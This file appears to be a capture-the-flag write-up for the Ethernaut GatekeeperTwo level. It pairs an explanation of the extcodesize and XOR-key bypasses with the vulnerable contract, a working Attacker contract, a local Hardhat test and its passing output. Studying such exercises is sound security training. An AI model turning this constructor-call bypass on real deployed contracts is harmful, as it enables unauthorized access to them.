@@ -1,0 +1,144 @@
+To pass gateOne(), we simply have to call GatekeeperTwo contract from another contract instead of an EOA.
+
+For gateTwo(), we are using the "extcodesize" opcode which returns the size of the contract code that is deployed at an address. This technique is used by contracts to check if the caller is an EOA or a Contract account. However if the caller calls this function from a constructor then extcodesize will simply zero as the contract has not been created yet. This is how we have implemented the constructor in our Attacker contract.
+
+To pass gateThree() modifier, we will exploit the arithmetic underflow vulnerability that was present in Solidity versions earlier than v0.8.1
+
+(uint64(0) - 1) causes an uint underflow and becomes 18446744073709551615 (1111111111111111111111111111111111111111111111111111111111111111)
+
+Our msg.sender = 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
+So, uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) gives 8758481235375558902 (111100110001100011000000100011101110110011111000001000011110110)
+
+Lets look at the problem again: require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+
+We have to find a "uint64 _gateKey" such that: 111100110001100011000000100011101110110011111000001000011110110 XOR uint64(_gateKey) = 1111111111111111111111111111111111111111111111111111111111111111
+
+So, uint64(_gateKey) = 1111111111111111111111111111111111111111111111111111111111111111 XOR 111100110001100011000000100011101110110011111000001000011110110 = 1000011001110011100111111011100010001001100000111110111100001001 (or 0x86739fb88983ef09)
+
+So our 8-byte _gateKey is 0x86739fb88983ef09
+
+
+GatekeeperTwo.sol:
+------------------
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    require(x == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attacker
+{
+    address victimContract;
+    constructor (address victim, bytes8 gateKey) payable
+    {
+        victimContract = victim;
+        attack(gateKey);
+    }
+
+    function attack(bytes8 gateKey) private
+    {       
+        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", gateKey);  
+        victimContract.call(payload);
+    }
+}
+
+
+Solution.js (Hardhat test):
+---------------------------
+
+const { expect } = require("chai");
+const { Wallet } = require("ethers");
+const { ethers, network } = require("hardhat");
+
+describe("Hello.sol", () => {
+
+    describe("Test run", () => {
+        it("should run fine", async () => {
+            
+            // Deploy GatekeeperTwo contract
+            const [owner] = await ethers.getSigners();    
+            const gatekeeper2Contract = await ethers.getContractFactory("GatekeeperTwo")
+            const gatekeeper2 = await gatekeeper2Contract.deploy();
+            await gatekeeper2.deployed();
+
+            // Verify deployment
+            const gatekeeper2Address = gatekeeper2.address
+            console.log("gatekeeperAddress = " + gatekeeper2Address)
+
+            // Read the value of GatekeeperTwo.entrant state variable before attack
+            const stor1 = await ethers.provider.getStorageAt(gatekeeper2Address, 0);
+            console.log("Value of GatekeeperTwo.entrant state variable before attack: ", stor1)
+            
+            // Deploy Attacker contract
+            const attackerContract = await ethers.getContractFactory("Attacker")
+            // GatekeeperTwo's address is 0x5FbDB2315678afecb367f032d93F642f64180aa3
+            // Send 5 ether while deploying Attacker
+            const attacker = await attackerContract.deploy("0x5FbDB2315678afecb367f032d93F642f64180aa3", "0x86739fb88983ef09", {value: ethers.utils.parseEther('5')});
+            await attacker.deployed();
+            
+            // Deployer address
+            const deployerAddress = owner.address
+            console.log("deployerAddress = " + deployerAddress)
+
+            // Read the value of GatekeeperTwo.entrant state variable after attack
+            const stor2 = await ethers.provider.getStorageAt(gatekeeper2Address, 0);
+            console.log("Value of GatekeeperOne.entrant state variable after attack: ", stor2)
+
+            
+            // Verify deployment
+            const gatekeeper1Address = gatekeeper2.address
+            console.log("gatekeeperAddress = " + gatekeeper1Address)
+            const attackerAddress = attacker.address
+            console.log("attackerAddress = " + attackerAddress)
+            const attackerBalance = await ethers.provider.getBalance(attackerAddress)
+            console.log("attackerBalance: ", attackerBalance)    
+        });
+    });
+});
+
+
+Output:
+-------
+
+root@ununtu-vm:/home/user/Desktop/hardhat/ethernaut/gatekeeper2# npx hardhat test
+
+
+  Hello.sol
+    Test run
+gatekeeperAddress = 0x5FbDB2315678afecb367f032d93F642f64180aa3
+Value of GatekeeperTwo.entrant state variable before attack:  0x0000000000000000000000000000000000000000000000000000000000000000
+deployerAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+Value of GatekeeperOne.entrant state variable after attack:  0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266
+gatekeeperAddress = 0x5FbDB2315678afecb367f032d93F642f64180aa3
+attackerAddress = 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
+attackerBalance:  BigNumber { value: "5000000000000000000" }
+      ✔ should run fine (737ms)
